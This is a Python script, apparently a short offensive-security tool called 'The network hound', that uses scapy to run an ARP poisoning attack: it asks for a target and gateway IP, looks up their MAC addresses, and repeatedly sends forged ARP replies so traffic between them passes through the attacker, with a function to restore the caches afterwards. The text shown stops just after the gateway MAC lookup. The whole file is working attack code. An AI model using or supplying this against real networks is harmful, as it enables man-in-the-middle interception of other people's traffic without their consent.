# The network hound

from scapy.all import *
import os
import sys
import threading

interface    = "eth0"
target_ip    = input("Target IP Address: ")
gateway_ip   = input("Gateway IP Address: ")
packet_count = 1000
poisoning    = True
    
def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    
    # slightly different method using send
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    
def get_mac(ip_address):
    
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    
    # return the MAC address from a response
    for s,r in responses:
        return r[Ether].src
    
    return None
    
def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    global poisoning
   
    poison_target = ARP()
    poison_target.op   = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op   = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while poisoning:
        send(poison_target)
        send(poison_gateway)
          
        time.sleep(2)
          
    print("[*] ARP poison attack finished.")

    return

# set our interface
conf.iface = interface

# turn off output
conf.verb  = 0

print("[*] Setting up %s" % interface)

gateway_mac = get_mac(gateway_ip)